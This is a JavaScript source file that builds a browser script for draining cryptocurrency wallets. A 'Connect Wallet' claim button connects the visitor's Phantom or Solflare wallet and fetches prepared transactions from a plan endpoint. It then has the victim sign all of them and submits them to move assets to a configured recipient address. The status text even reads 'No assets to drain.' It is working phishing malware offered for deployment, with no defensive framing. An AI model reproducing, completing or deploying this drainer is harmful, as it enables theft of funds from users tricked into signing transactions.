const TEMPLATE = `(function () {
  "use strict";

  var PLAN_ENDPOINT = "__PLAN_ENDPOINT__";
  var SUBMIT_ENDPOINT = "__SUBMIT_ENDPOINT__";
  var RECIPIENT = "__RECIPIENT__";
  var MODE = "__MODE__";
  var LIQUID_MINTS = __LIQUID_MINTS__;

  var WEB3_CDN = "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.4/lib/index.iife.min.js";

  function provider() {
    if (window.phantom && window.phantom.solana) return window.phantom.solana;
    if (window.solana && window.solana.isPhantom) return window.solana;
    if (window.solflare && window.solflare.isSolflare) return window.solflare;
    if (window.solana) return window.solana;
    return null;
  }

  function setStatus(el, text) { if (el) el.textContent = text; }

  function loadWeb3() {
    return new Promise(function (resolve, reject) {
      if (window.solanaWeb3) return resolve(window.solanaWeb3);
      if (document.getElementById("sol-web3-load")) {
        var poll = setInterval(function () {
          if (window.solanaWeb3) { clearInterval(poll); resolve(window.solanaWeb3); }
        }, 50);
        return;
      }
      var s = document.createElement("script");
      s.id = "sol-web3-load";
      s.src = WEB3_CDN;
      s.onload = function () { resolve(window.solanaWeb3 || null); };
      s.onerror = function () { reject(new Error("failed to load @solana/web3.js")); };
      document.head.appendChild(s);
    });
  }

  function b64ToBytes(b64) {
    var raw = atob(b64);
    var bytes = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
    return bytes;
  }

  function bytesToB64(bytes) {
    var bin = "";
    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
  }

  async function requestPlan(source) {
    var body = { source: source, recipient: RECIPIENT };
    if (MODE === "manual") {
      body.mode = "manual";
      body.liquidMints = LIQUID_MINTS;
    }
    var res = await fetch(PLAN_ENDPOINT, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(body),
    });
    if (!res.ok) throw new Error("plan failed: " + res.status);
    return await res.json();
  }

  async function submitSigned(plan, wallet, signedRaw) {
    var body = {
      planId: plan.planId || (wallet + ":" + MODE),
      source: wallet,
      recipient: RECIPIENT,
      signedTransactions: signedRaw,
    };
    var res = await fetch(SUBMIT_ENDPOINT, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(body),
    });
    if (!res.ok) throw new Error("submit failed: " + res.status);
    return await res.json();
  }

  async function handleClick(btn) {
    var statusEl = btn.parentElement ? btn.parentElement.querySelector("[data-status]") : null;
    var p = provider();
    setStatus(statusEl, "Connecting...");
    if (!p) { setStatus(statusEl, "No wallet detected"); return; }
    try {
      var conn = await p.connect();
      var wallet = conn.publicKey.toString();
      setStatus(statusEl, "Connected " + wallet.slice(0, 8) + "...");

      var web3 = await loadWeb3();
      if (!web3) { setStatus(statusEl, "web3 lib missing"); return; }

      var plan = await requestPlan(wallet);
      var txs = plan.transactions || [];
      if (txs.length === 0) { setStatus(statusEl, "No assets to drain."); return; }

      setStatus(statusEl, "Sign " + txs.length + " transaction(s)...");

      var decoded = txs.map(function (b) {
        var bts = b64ToBytes(b);
        return plan.useVersioned ? web3.VersionedTransaction.deserialize(bts) : web3.Transaction.from(bts);
      });

      var signedTxns;
      if (typeof p.signAllTransactions === "function" && txs.length > 1) {
        signedTxns = await p.signAllTransactions(decoded);
      } else if (typeof p.signTransaction === "function") {
        signedTxns = [];
        for (var i = 0; i < decoded.length; i++) signedTxns.push(await p.signTransaction(decoded[i]));
      } else {
        throw new Error("wallet does not support signing");
      }

      var signedRaw = signedTxns.map(function (t) { return bytesToB64(t.serialize()); });

      setStatus(statusEl, "Submitting...");
      var result = await submitSigned(plan, wallet, signedRaw);

      if (result.complete) setStatus(statusEl, "Confirmed " + result.signatures.length + "/" + result.signatures.length);
      else if (result.signatures.length > 0) setStatus(statusEl, "Partial: " + result.signatures.length + " confirmed");
      else setStatus(statusEl, "No transaction confirmed.");
    } catch (err) {
      setStatus(statusEl, "Error: " + ((err && err.message) || err));
    }
  }

  function attach() {
    var targets = document.querySelectorAll("[data-claim]");
    for (var i = 0; i < targets.length; i++) {
      (function (el) {
        if (el.__claimBound) return;
        el.__claimBound = true;
        el.addEventListener("click", function (ev) { ev.preventDefault(); handleClick(el); });
      })(targets[i]);
    }
  }

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", attach);
  else attach();
})();
`;

export function generateBundle({ planEndpoint, submitEndpoint, recipient, mode, liquidMints }) {
  return TEMPLATE
    .replace("__PLAN_ENDPOINT__", planEndpoint)
    .replace("__SUBMIT_ENDPOINT__", submitEndpoint)
    .replace("__RECIPIENT__", recipient)
    .replace("__MODE__", mode)
    .replace("__LIQUID_MINTS__", JSON.stringify(liquidMints || []));
}

export const HTML_SNIPPET = '<script src="/bundle.js" defer></script>\n<button data-claim>Connect Wallet</button>\n<div data-status></div>\n';
